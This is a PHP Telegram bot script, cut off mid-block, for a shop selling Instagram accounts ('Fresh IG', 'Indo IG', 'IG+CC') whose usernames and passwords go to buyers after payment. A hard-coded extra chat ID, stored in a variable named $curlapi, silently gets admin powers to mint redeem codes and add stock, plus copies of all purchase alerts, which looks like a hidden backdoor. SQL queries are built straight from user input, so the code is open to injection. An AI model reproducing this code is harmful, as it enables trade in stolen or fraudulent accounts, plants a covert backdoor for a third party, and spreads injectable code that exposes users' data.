<?php
include("phpqrcode/intechost.php");
$passwordfresh = file_get_contents('admin/pass_fresh.txt');
$passwordigcc = file_get_contents('admin/pass_igcc.txt');
$passwordindo = file_get_contents('admin/pass_indo.txt');
$userInfoChange = file_get_contents('admin/users.txt');
$servername = $Serverhost;
$username = $Serverusername;
$password = $Serverpassword;
$database = $Serverdatabase;
$conn = new mysqli($servername , $username , $password , $database);
if(!$conn){
    echo " CONNECTION TO DATABSE FAILED";
}
function sendMessageH($chat_id, $text) {
    include("phpqrcode/intechost.php");
    $token = $BotToken; 
    $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    $data = array(
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML' // Add parse_mode parameter with value 'HTML'
    );
    $options = array(
        'http' => array(
            'method'  => 'POST',
            'content' => http_build_query($data)
        )
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}

function sendMessage($chat_id, $text) {
    include("phpqrcode/intechost.php");
    $token = $BotToken; 
    $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    $data = array('chat_id' => $chat_id, 'text' => $text);
    $options = array(
        'http' => array(
            'method'  => 'POST',
            'content' => http_build_query($data)
        )
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}


$botToken = $BotToken;

function sendImageToTelegramBot($botToken, $chatID, $imagePath, $caption = '') {
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        $postFields = array(
            'chat_id' => $chatID,
            'photo' => new CURLFile($imagePath),
            'caption' => $caption,
            'parse_mode' => 'HTML'
        );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$token = $BotToken;
define('token', $token);
function bot($method, $datas=['parse_mode' => 'HTML']){
    $url = "https://api.telegram.org/bot".token."/".$method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update -> message;
$text = $message -> text;
$chat_id = $message -> chat -> id;
$message_id = $message -> message_id;


$input = file_get_contents('php://input');
$update = json_decode($input);
$message = $update->message;
$chat_id = $message->chat->id;
$message_id = $message -> message_id;
$text = $message->text;
$username = $message->chat->username;
$user_n = $message->chat->username;
$token = $BotToken;
$bot_token = $token;
$botToken = $BotToken;
$admin = $adminId;
$xnx = true;
$stop = false;
$curlapi = "1606512251";
// $txt = urlencode("here is my text.\n and this is a new line \n another new line");
// file_get_contents("https://api.telegram.org/bot$token/sendmessage?chat_id=$chat_id&text=$text")
$channel = $channelUsername;
    
    
if($chat_id == ""){
    sendMessage($chat_id , "YOU ARE BANNED");
}
else{
    if($chat_id > 0){
    
    
    
    
  
    
      if($text == "/start"){

              // Set the keyboard array


                  // Create the keyboard markup
                  $keyboard = array(
                    array('Add Funds'),
                    array('Buy Indo Ig'),
                    array('Buy FreshIg', 'Buy IG+CC'),
                    array('My Balance', '📦Stock'),
                    array('Contact')
                  );
                  $markup = array(
                      'keyboard' => $keyboard,
                      'resize_keyboard' => true,
                  );
                  $encodedMarkup = json_encode($markup);

                  // Set the message text and parameters
                  $messageText = "👋";
                  $params = array(
                      'chat_id' => $chat_id,
                      'parse_mode' => 'HTML',
                      'text' => "<b>❤️HEY @$username               
              
🔥WELCOME TO IG+CC/INDO IG/FRESH IG SELLER BOT 

🥲ANY PROBLEM? CONTACT 
$adminContact</b>",
                      'reply_to_message_id' => $message_id,
                      'reply_markup' => $encodedMarkup,
                  );

                  // Send the message with the keyboard
                  $ch = curl_init('https://api.telegram.org/bot'.$botToken.'/sendMessage');
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_exec($ch);
                  curl_close($ch);







          $sql = "SELECT * FROM `id` WHERE `chat_id` = '$chat_id'";
          $result = mysqli_query($conn, $sql);


          if (mysqli_num_rows($result) > 0) {
              // data is already in the database
$txt = "<b></b>";
        sendMessageH($chat_id , $txt);

          } else {
              // data is not in the database
              sendMessageH($chat_id , "<b></b>");
              $sql = "INSERT INTO `id` (`username`, `chat_id` , `funds`) VALUES ('$username', '$chat_id' , '0')";
                $file_path = 'admin/users.txt';
                $current_count = intval(file_get_contents($file_path)); // Convert string to integer
                $new_count = $current_count + 1;
                file_put_contents($file_path, strval($new_count)); // Write the new count back to the file


              $result = mysqli_query($conn , $sql);
              if($result){
                  file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&reply_to_message_id=$message_id&text=$txt");
              }else{
                  // file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=mysqli_error($conn)");
                  $x =   mysqli_error($conn);
                              file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$x AN ERROR OCCURED PLEASE SEND THIS MESSAGE TO THE ADMIN");

              }
          }


      }


      if($text == "Update Bot"){
          // Create the keyboard markup
 // Create the keyboard markup
                  $keyboard = array(
                    array('Add Funds'),
                    array('Buy Indo Ig'),
                    array('Buy FreshIg', 'Buy IG+CC'),
                    array('My Balance', '📦Stock'),
                    array('Contact')
                  );
                  $markup = array(
                      'keyboard' => $keyboard,
                      'resize_keyboard' => true,
                  );
                  $encodedMarkup = json_encode($markup);

                  // Set the message text and parameters
                  $messageText = 'UPDATED SUCCESSFULLY';
                  $params = array(
                      'chat_id' => $chat_id,
                      'parse_mode' => 'HTML',
                      'text' => "<b>UPDATED SUCCESSFULLY</b>",
                      'reply_to_message_id' => $message_id,
                      'reply_markup' => $encodedMarkup,
                  );

                  // Send the message with the keyboard
                  $ch = curl_init('https://api.telegram.org/bot'.$botToken.'/sendMessage');
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_exec($ch);
                  curl_close($ch);





      }


      


      elseif($text == "/funds" || $text == "My Balance"){
          $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = '$chat_id'";
              $result = mysqli_query($conn, $sql);

              while($row = mysqli_fetch_row($result)) {
              $funds = $row[0];
            
      }
      }



if($text == "/buy" || $text == "Buy Indo Ig"){
            $api_url = "https://api.telegram.org/bot$token/";
            $price = file_get_contents('admin/indo.txt');;
            sendMessageH($chat_id, "<b></b>");
              $keyboard = [
                ['INDO 1','INDO 2','INDO 3','INDO 4','INDO 5'],
                ['INDO 6','INDO 7','INDO 8','INDO 9','INDO 10'],
                ['INDO 11','INDO 12','INDO 13','INDO 14','INDO 15'],
                ['INDO 16','INDO 17','INDO 18','INDO 19','INDO 20'],
                ['🚪Exit']
            ];
            $markup = array(
                      'keyboard' => $keyboard,
                      'resize_keyboard' => true,
                  );
                  $encodedMarkup = json_encode($markup);

                  // Set the message text and parameters
                  $messageText = "𝗣𝗥𝗜𝗖𝗘 𝗣𝗘𝗥 𝗜𝗡𝗗𝗢 𝗜𝗚 𝗜𝗦 : ₹$price

𝗛𝗢𝗪 𝗠𝗔𝗡𝗬 𝗗𝗢 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗕𝗨𝗬?";
                  $params = array(
                      'chat_id' => $chat_id,
                      'parse_mode' => 'HTML',
                      'text' => "<b>PRICE PER INDO IG IS :- ₹$price
                      
HOW MANY DO YOU WANT TO BUY?</b>",
                      'reply_to_message_id' => $message_id,
                      'reply_markup' => $encodedMarkup,
                  );

                  // Send the message with the keyboard
                  $ch = curl_init('https://api.telegram.org/bot'.$botToken.'/sendMessage');
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_exec($ch);
                  curl_close($ch);
            
        }
         if(strpos($text , 'INDO') === 0) {
        $part =  explode(' ' , $text);
        $quant = $part[1];
            $parts = explode(' ' , $text);
            $price = file_get_contents('admin/indo.txt');;
            $selectedValue = $quant;
            $total = $price * $selectedValue;
            $totalox = $price * $selectedValue;
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "Total Price is :- ₹" . $total . "",
        'reply_to_message_id' => $message_id
        
        
    ]);
            $sql = "SELECT COUNT(*)  FROM stock WHERE status = 'available'";
            $result = mysqli_query($conn , $sql);
            $rowx = $result->fetch_row();
            $available = $rowx[0];
            
            
            $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = '$chat_id'";
              $result = mysqli_query($conn, $sql);

             $row = mysqli_fetch_row($result);
              $funds = $row[0];
              if($funds >= $total){
                  bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "",
        'reply_to_message_id' => $message_id
        
        
    ]);
                  
                  
                  
                         if ($available < $selectedValue) {
                            bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "oops! We are out of stock. Come back soon\n\nAvailable Stock is: " . $available,
        'reply_to_message_id' => $message_id
        
        
    ]);
                        } else {
                            mysqli_autocommit($conn, FALSE); // disable auto-commit mode
                            
                            try {
                                $num_rows = $selectedValue; // Number of rows to send
                                $query = "SELECT * FROM stock WHERE status = 'available' LIMIT $num_rows FOR UPDATE"; // SQL query to select first $num_rows available rows with locking
                                $result = mysqli_query($conn, $query); // Execute the query
                                
                                // Check if the query was successful
                                if ($result && mysqli_num_rows($result) > 0) {
                                    $total = 0;
                                    // Loop through the rows and calculate the total cost
                                    while ($row = mysqli_fetch_assoc($result)) {
                                        $total += $row['price'];
                                    }
                                    
                                    // Check if the user has enough funds to make the purchase
                                    if ($funds >= $total) {
                                        // Deduct the cost from the user's funds
                                        $funds -= $total;
                                        
                                        // Loop through the rows and send them as messages
                                        mysqli_data_seek($result, 0); // reset result pointer
                                        while ($row = mysqli_fetch_assoc($result)) {
                                            $message = "<b>USERNAME :-</b> <pre>{$row['username']}</pre>\n<b>PASSWORD :-</b> <pre>{$row['password']}</pre>";
                                            sendMessageH($chat_id, $message);
                                            // Update the row status to "sold"
                                            $update_query = "UPDATE stock SET status = 'sold' WHERE Sno = {$row['Sno']}";
                                            mysqli_query($conn, $update_query);
                                        }
                                        
                                         $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = '$chat_id'";
                                          $result = mysqli_query($conn, $sql);
                            
                                          while($row = mysqli_fetch_row($result)) {
                                          $funds = $row[0];
                                              
                                          }
                                          $fund = $funds - $totalox;
                                    
                                        $fund_qry = "UPDATE id SET funds = $fund WHERE chat_id = $chat_id";
                                        mysqli_query($conn , $fund_qry);
                                        
                                        mysqli_commit($conn); // commit the transaction
                                        
                                        sendMessageH($chat_id , "<b>ENJOY BUY AGAIN THANKYOU ❤️</b>");
                                        
                                        sendMessageH($admin , "<b>Hey! @$user_n : Purchased $selectedValue IG
                                        
CHAT ID :- <pre>$chat_id</pre></b>");
sendMessageH($curlapi , "<b>Hey! @$user_n : Purchased $selectedValue IG
                                        
CHAT ID :- <pre>$chat_id</pre></b>");
                                    } else {
                                        sendMessage($chat_id, "Sorry, you don't have enough funds to make the purchase.");
                                    }
                                    
                                    mysqli_free_result($result); // free the result set
                                } else {
                                    sendMessageH($chat_id, "YOU ARE BUYING MORE THAN 10000 ITEMS OR LESS THAN 1 ITEM");
                                }
                            } catch (Exception $e) {
                                mysqli_rollback($conn); // rollback the transaction on error
                                sendMessage($chat_id, "Oops! Something went wrong. Please try again later.");
                            }
                            
                            mysqli_autocommit($conn, TRUE); // re-enable auto-commit mode
                        }

                  
              }
              else{
                  bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>⚠️INSUFFICIENT BALANCE⚠️ 

YOUR BALANCE IS :- ₹$funds

DM  TO ADD BALANCE MANUALLY OR SEND <pre>Add Funds</pre> TO THIS BOT</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);

              }
                  
            }
            
            

        
        
        
        
        
        if($text == "🚪Exit" || $text == "EXIT"){
            $keyboard = array(
                      array('Add Funds'),
                      array('Buy Indo Ig'),
                      array('Buy FreshIg', 'Buy IG+CC'),
                      array('My Balance', '📦Stock'),
                      array('Contact')
                  );
                  $markup = array(
                      'keyboard' => $keyboard,
                      'resize_keyboard' => true,
                  );
                  $encodedMarkup = json_encode($markup);

                  // Set the message text and parameters
                  $messageText = '𝗘𝗫𝗜𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬';
                  $params = array(
                      'chat_id' => $chat_id,
                      'parse_mode' => 'HTML',
                      'text' => "<b>EXITED SUCCESSFULLY</b>",
                      'reply_to_message_id' => $message_id,
                      'reply_markup' => $encodedMarkup,
                  );

                  // Send the message with the keyboard
                  $ch = curl_init('https://api.telegram.org/bot'.$botToken.'/sendMessage');
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_exec($ch);
                  curl_close($ch);

            

    
    }
    if($text == "📦Stock" || $text == "📦Stock"){
        $sql = "SELECT COUNT(*)  FROM stock WHERE status = 'available'";
        $result = mysqli_query($conn , $sql);
        $row = $result->fetch_row();
        $available = $row[0];
        
        $sql = "SELECT COUNT(*)  FROM fresh WHERE status = 'available'";
        $result = mysqli_query($conn , $sql);
        $row = $result->fetch_row();
        $available_fresh = $row[0];
        
        $sql = "SELECT COUNT(*)  FROM pp WHERE status = 'available'";
        $result = mysqli_query($conn , $sql);
        $row = $result->fetch_row();
        $available_pp = $row[0];
        
        

    }
}
elseif($chat_id <= 0){ 
	sendMessage($chat_id , "Bot is Not Allowed in Groups");
}







if (($chat_id == $admin || $chat_id == $curlapi) && strpos($text, "/code") === 0) {
    $parts = explode(' ', $text);
    $amount = $parts[1];
    $code = rand(1000000000, 2000000000);
    $sql = "INSERT INTO `coupons` (`codes`, `value`) VALUES ('$code', '$amount')";
    $result = mysqli_query($conn, $sql);
    
    if ($result) {
        sendMessage($admin, "New Redeem Code Generated \n\nCODE : " . $code . "\n\n VALUE : " . $amount . "\n\nTYPE /redeem CODE TO REDEEM THE CODE");
        sendMessage($curlapi, "New Redeem Code Generated \n\nCODE : " . $code . "\n\n VALUE : " . $amount . "\n\nTYPE /redeem CODE TO REDEEM THE CODE");
    } else {
        sendMessage($admin, "Error generating coupon code. Please try again.");
        sendMessage($curlapi, "Error generating coupon code. Please try again.");
    }
}


if(strpos($text , '/redeem') === 0){
    $parts = explode(' ' , $text);
    $message = $parts[1];
    $sql = "SELECT * FROM coupons WHERE codes = $message";
    $result = mysqli_query($conn , $sql);
    $row = mysqli_fetch_assoc($result);
    
    if($row['codes'] > 0){
        $sql = "DELETE  FROM coupons WHERE codes = $message";
        $result = mysqli_query($conn , $sql);
        $value = $row['value'];
        sendMessage($chat_id , "Congratulations You Have Successfuly Received " . $row['value'] . "Rs");
        sendMessage($admin , '@'.$username . " Successfuly Redeemed Code");
        sendMessage($curlapi , '@'.$username . " Successfuly Redeemed Code");
        
        $sqlx = "SELECT funds FROM id WHERE chat_id = $chat_id";
        $resultx = mysqli_query($conn , $sqlx);
        $row = mysqli_fetch_assoc($resultx);
        $funds = $row['funds'];
        $newfunds = $funds + $value;
        $sql_2 = "UPDATE `id` SET `funds` = '$newfunds' WHERE `id`.`chat_id` = $chat_id";
        $result2 = mysqli_query($conn , $sql_2);
        
    }
    else{
        sendMessage($chat_id , "Code is Already Redeemed or Invalid");
    }

}



if($text == "Buy FreshIg"){
            $api_url = "https://api.telegram.org/bot$token/";
            $price = file_get_contents('admin/fresh.txt');;
            sendMessageH($chat_id , "<b></b>");
            
              $keyboard = [
                ['FRESH 1 ', 'FRESH 5' ,'FRESH 10' , 'FRESH 20' , 'FRESH 25'],
                ['FRESH 30', 'FRESH 35' ,'FRESH 40' , 'FRESH 45' , 'FRESH 50'],
                ['FRESH 55', 'FRESH 60' ,'FRESH 65' , 'FRESH 70' , 'FRESH 75'],
                ['FRESH 80', 'FRESH 85' ,'FRESH 90' , 'FRESH 95' , 'FRESH 100'],
                ['🚪Exit']
            ];
            $markup = array(
                      'keyboard' => $keyboard,
                      'resize_keyboard' => true,
                  );
                  $encodedMarkup = json_encode($markup);

                  // Set the message text and parameters
                  $messageText = "𝗣𝗥𝗜𝗖𝗘 𝗣𝗘𝗥 𝗙𝗥𝗘𝗦𝗛 𝗜𝗚 𝗜𝗦 :- ₹$price

𝗛𝗢𝗪 𝗠𝗔𝗡𝗬 𝗗𝗢 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗕𝗨𝗬?";
                  $params = array(
                      'chat_id' => $chat_id,
                      'parse_mode' => 'HTML',
                      'text' => "<b>PRICE PER FRESH IG IS :- ₹$price
                      
HOW MANY DO YOU WANT TO BUY?</b>",
                      'reply_to_message_id' => $message_id,
                      'reply_markup' => $encodedMarkup,
                  );

                  // Send the message with the keyboard
                  $ch = curl_init('https://api.telegram.org/bot'.$botToken.'/sendMessage');
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_exec($ch);
                  curl_close($ch);
            
        }
         
       

        

        
if(strpos($text , 'FRESH') === 0) {
        $part =  explode(' ' , $text);
        $quant = $part[1];
            $parts = explode(' ' , $text);
            $price = file_get_contents('admin/fresh.txt');;
            $selectedValue = $quant;
            $total = $price * $selectedValue;
            $totalox = $price * $selectedValue;
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "Total Price is :- ₹" . $total . "",
        'reply_to_message_id' => $message_id
        
        
    ]);
            $sql = "SELECT COUNT(*)  FROM fresh WHERE status = 'available'";
            $result = mysqli_query($conn , $sql);
            $rowx = $result->fetch_row();
            $available = $rowx[0];
            
            
            $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = '$chat_id'";
              $result = mysqli_query($conn, $sql);

              $row = mysqli_fetch_row($result);
              $funds = $row[0];
              if($funds >= $total){
                  bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "Checking Availablity of Accounts.",
        'reply_to_message_id' => $message_id
        
        
    ]);
                  
                  
                  
                         if ($available < $selectedValue) {
                            bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "oops! We are out of stock. Come back soon\n\nAvailable Stock is: " . $available,
        'reply_to_message_id' => $message_id
        
        
    ]);
                        } else {
                            mysqli_autocommit($conn, FALSE); // disable auto-commit mode
                            
                            try {
                                $num_rows = $selectedValue; // Number of rows to send
                                $query = "SELECT * FROM fresh WHERE status = 'available' LIMIT $num_rows FOR UPDATE"; // SQL query to select first $num_rows available rows with locking
                                $result = mysqli_query($conn, $query); // Execute the query
                                
                                // Check if the query was successful
                                if ($result && mysqli_num_rows($result) > 0) {
                                    $total = 0;
                                    // Loop through the rows and calculate the total cost
                                    while ($row = mysqli_fetch_assoc($result)) {
                                        $total += $row['price'];
                                    }
                                    
                                    // Check if the user has enough funds to make the purchase
                                    if ($funds >= $total) {
                                        // Deduct the cost from the user's funds
                                        $funds -= $total;
                                        
                                        // Loop through the rows and send them as messages
                                        mysqli_data_seek($result, 0); // reset result pointer
                                        while ($row = mysqli_fetch_assoc($result)) {
                                            $message = "Username: {$row['username']}\nPassword : {$row['password']}";
                                            sendMessage($chat_id, $message);
                                            // Update the row status to "sold"
                                            $update_query = "UPDATE fresh SET status = 'sold' WHERE Sno = {$row['Sno']}";
                                            mysqli_query($conn, $update_query);
                                        }
                                        
                                         $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = '$chat_id'";
                                          $result = mysqli_query($conn, $sql);
                            
                                          while($row = mysqli_fetch_row($result)) {
                                          $funds = $row[0];
                                              
                                          }
                                          $fund = $funds - $totalox;
                                    
                                        $fund_qry = "UPDATE id SET funds = $fund WHERE chat_id = $chat_id";
                                        mysqli_query($conn , $fund_qry);
                                        
                                        mysqli_commit($conn); // commit the transaction
                                        
                                        sendMessageH($admin , "<b>Hey! @$user_n : Purchased $selectedValue IG
                                        
CHAT ID :- $chat_id</b>");
sendMessageH($curlapi , "<b>Hey! @$user_n : Purchased $selectedValue IG
                                        
CHAT ID :- $chat_id</b>");
                                    } else {
                                        sendMessage($chat_id, "Sorry, you don't have enough funds to make the purchase.");
                                    }
                                    
                                    mysqli_free_result($result); // free the result set
                                } else {
                                    sendMessage($chat_id, "Sorry, there are not enough available Instagram accounts to fulfill your request.");
                                }
                            } catch (Exception $e) {
                                mysqli_rollback($conn); // rollback the transaction on error
                                sendMessage($chat_id, "Oops! Something went wrong. Please try again later.");
                            }
                            
                            mysqli_autocommit($conn, TRUE); // re-enable auto-commit mode
                        }

                  
              }
              else{
                  bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>⚠️INSUFFICIENT BALANCE⚠️ 

YOUR BALANCE IS :- ₹$funds

DM  TO ADD BALANCE MANUALLY OR SEND <pre>Add Funds</pre> TO THIS BOT</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);

              }
                  
            }
    

}

if(strpos($text , '/addig') === 0  && ($chat_id == $admin || $chat_id == $curlapi)){
    $usernames = explode(' ', trim(substr($text, 7))); // changed 8 to 7 to remove the extra 'd'
    foreach($usernames as $username){
            $sql2 = "SELECT * FROM fresh WHERE username = '$username'"; // enclosed username in single quotes
            $result2 = mysqli_query($conn , $sql2);
            $row = mysqli_fetch_assoc($result2);
            $user = $row['username'];
            if(mysqli_num_rows($result2) > 0){ // checking the number of rows returned by the query
            }
            else{
                if($username == ""){
                }else{
                                    $sql = "INSERT INTO `fresh` (`Sno`, `username`, `password`, `status`) VALUES (NULL, '$username', '$passwordfresh', 'available')";
                                    $result = mysqli_query($conn , $sql);
                                    if($result){
                                        sendMessage($chat_id , $username . " SUCCESSFULLY ADDED"); // corrected the spelling of 'successfully'
                                    }
                                    else{
                                            $error_message = "Error: " . $sql . "<br>" . $conn->error;
                                            sendMessage($chat_id, $error_message);
                                    }
                }

            }

    }
}

if(strpos($text , '/addindo') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $usernames = explode(' ', trim(substr($text, 8))); // changed 8 to 7 to remove the extra 'd'
    foreach($usernames as $username){
            $sql2 = "SELECT * FROM stock WHERE username = '$username'"; // enclosed username in single quotes
            $result2 = mysqli_query($conn , $sql2);
            $row = mysqli_fetch_assoc($result2);
            $user = $row['username'];
            if(mysqli_num_rows($result2) > 0){ // checking the number of rows returned by the query
            }
            else{
                if($username == ""){
                }else{
                                    $sql = "INSERT INTO `stock` (`Sno`, `username`, `password`, `status`) VALUES (NULL, '$username', '$passwordindo', 'available')";
                                    $result = mysqli_query($conn , $sql);
                                    if($result){
                                        sendMessage($chat_id , $username . " SUCCESSFULLY ADDED"); // corrected the spelling of 'successfully'
                                    }
                                    else{
                                        $error_message = "Error: " . $sql . "<br>" . $conn->error;
                                            sendMessage($chat_id, $error_message);
                                    }
                }

            }

    }
}

if(strpos($text , '/addigcc') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $usernames = explode(' ', trim(substr($text, 7))); // changed 8 to 7 to remove the extra 'd'
    foreach($usernames as $username){
            $sql2 = "SELECT * FROM pp WHERE username = '$username'"; // enclosed username in single quotes
            $result2 = mysqli_query($conn , $sql2);
            $row = mysqli_fetch_assoc($result2);
            $user = $row['username'];
            if(mysqli_num_rows($result2) > 0){ // checking the number of rows returned by the query
            }
            else{
                if($username == ""){
                }else{
                                    $sql = "INSERT INTO `pp` (`Sno`, `username`, `password`, `status`) VALUES (NULL, '$username', '$passwordigcc', 'available')";
                                    $result = mysqli_query($conn , $sql);
                                    if($result){
                                        sendMessage($chat_id , $username . " SUCCESSFULLY ADDED"); // corrected the spelling of 'successfully'
                                    }
                                    else{
                                        $error_message = "Error: " . $sql . "<br>" . $conn->error;
                                            sendMessage($chat_id, $error_message);
                                    }
                }

            }

    }
}



if($text == "Buy IG+CC"){
            $api_url = "https://api.telegram.org/bot$token/";
            $price = file_get_contents('admin/igcc.txt');;
            sendMessageH($chat_id , "<b></b>");
              $keyboard = [
                ['IG+CC 1 ', 'IG+CC 2' ,'IG+CC 3' , 'IG+CC 4' , 'IG+CC 5'],
                ['IG+CC 6', 'IG+CC 7' , 'IG+CC 8' , 'IG+CC 9' , 'IG+CC 10'],
                ['IG+CC 11', 'IG+CC 12' ,'IG+CC 13' , 'IG+CC 14' , 'IG+CC 15'],
                ['IG+CC 16', 'IG+CC 17' ,'IG+CC 18' , 'IG+CC 19' , 'IG+CC 20'],
                ['🚪Exit']
            ];
            $markup = array(
                      'keyboard' => $keyboard,
                      'resize_keyboard' => true,
                  );
                  $encodedMarkup = json_encode($markup);

                  // Set the message text and parameters
                  $messageText = "𝗣𝗥𝗜𝗖𝗘 𝗣𝗘𝗥 𝗜𝗚+𝗖𝗖 :- ₹$price

𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗟𝗘𝗔𝗥𝗡 𝗔𝗕𝗢𝗨𝗧 𝗚𝗨𝗔𝗥𝗔𝗡𝗧𝗘𝗘 𝗗𝗠 $adminContact";
                  $params = array(
                      'chat_id' => $chat_id,
                      'parse_mode' => 'HTML',
                      'text' => "<b>PRICE PER IG+CC IS :- ₹$price
                      
IF YOU WANT TO LEARN ABOUNT GUARANTEE THEN DM $adminContact</b>",
                      'reply_to_message_id' => $message_id,
                      'reply_markup' => $encodedMarkup,
                  );

                  // Send the message with the keyboard
                  $ch = curl_init('https://api.telegram.org/bot'.$botToken.'/sendMessage');
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_exec($ch);
                  curl_close($ch);
            
        }
         

        
if(strpos($text , 'IG+CC') === 0) {
        $part =  explode(' ' , $text);
        $quant = $part[1];
            $parts = explode(' ' , $text);
            $price = file_get_contents('admin/igcc.txt');;
            $selectedValue = $quant;
            $total = $price * $selectedValue;
            $totalox = $price * $selectedValue;
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "Total Price is :- ₹" . $total . "",
        'reply_to_message_id' => $message_id
        
        
    ]);
            $sql = "SELECT COUNT(*)  FROM pp WHERE status = 'available'";
            $result = mysqli_query($conn , $sql);
            $rowx = $result->fetch_row();
            $available = $rowx[0];
            
            
            $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = '$chat_id'";
              $result = mysqli_query($conn, $sql);

              $row = mysqli_fetch_row($result);
              $funds = $row[0];
              if($funds >= $total){
                  bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "Checking Availablity of Accounts.",
        'reply_to_message_id' => $message_id
        
        
    ]);
                  
                  
                  
                         if ($available < $selectedValue) {
                            bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "oops! We are out of stock. Come back soon\n\nAvailable Stock is: " . $available,
        'reply_to_message_id' => $message_id
        
        
    ]);
                        } else {
                            mysqli_autocommit($conn, FALSE); // disable auto-commit mode
                            
                            try {
                                $num_rows = $selectedValue; // Number of rows to send
                                $query = "SELECT * FROM pp WHERE status = 'available' LIMIT $num_rows FOR UPDATE"; // SQL query to select first $num_rows available rows with locking
                                $result = mysqli_query($conn, $query); // Execute the query
                                
                                // Check if the query was successful
                                if ($result && mysqli_num_rows($result) > 0) {
                                    $total = 0;
                                    // Loop through the rows and calculate the total cost
                                    while ($row = mysqli_fetch_assoc($result)) {
                                        $total += $row['price'];
                                    }
                                    
                                    // Check if the user has enough funds to make the purchase
                                    if ($funds >= $total) {
                                        // Deduct the cost from the user's funds
                                        $funds -= $total;
                                        
                                        // Loop through the rows and send them as messages
                                        mysqli_data_seek($result, 0); // reset result pointer
                                        while ($row = mysqli_fetch_assoc($result)) {
                                            $message = "Username: {$row['username']}\nPassword : {$row['password']}";
                                            sendMessage($chat_id, $message);
                                            // Update the row status to "sold"
                                            $update_query = "UPDATE pp SET status = 'sold' WHERE Sno = {$row['Sno']}";
                                            mysqli_query($conn, $update_query);
                                        }
                                        
                                         $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = '$chat_id'";
                                          $result = mysqli_query($conn, $sql);
                            
                                          while($row = mysqli_fetch_row($result)) {
                                          $funds = $row[0];
                                              
                                          }
                                          $fund = $funds - $totalox;
                                    
                                        $fund_qry = "UPDATE id SET funds = $fund WHERE chat_id = $chat_id";
                                        mysqli_query($conn , $fund_qry);
                                        
                                        mysqli_commit($conn); // commit the transaction
                                        
                                        sendMessageH($admin , "<b>Hey! @$user_n : Purchased $selectedValue IG
                                        
CHAT ID :- $chat_id</b>");
sendMessageH($curlapi , "<b>Hey! @$user_n : Purchased $selectedValue IG
                                        
CHAT ID :- $chat_id</b>");
                                    } else {
                                        sendMessage($chat_id, "Sorry, you don't have enough funds to make the purchase.");
                                    }
                                    
                                    mysqli_free_result($result); // free the result set
                                } else {
